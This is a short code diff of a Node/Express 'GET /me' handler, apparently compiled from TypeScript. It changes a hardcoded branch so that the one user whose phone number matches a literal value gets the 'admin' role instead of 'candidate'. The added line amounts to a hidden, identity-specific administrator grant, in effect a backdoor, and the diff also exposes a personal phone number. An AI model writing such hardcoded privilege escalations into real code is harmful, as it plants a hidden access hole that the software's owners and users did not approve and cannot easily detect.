@@ -130,7 +130,7 @@ router.get("/me", auth_1.authenticate, async (req, res, next) => {
             throw new errorHandler_1.ApiError(404, "User not found");
         }
         if (user.phoneNumber == "+918595264114") {
-            user.role = "candidate";
+            user.role = "admin";
             return res.json({
                 success: true,
                 user,
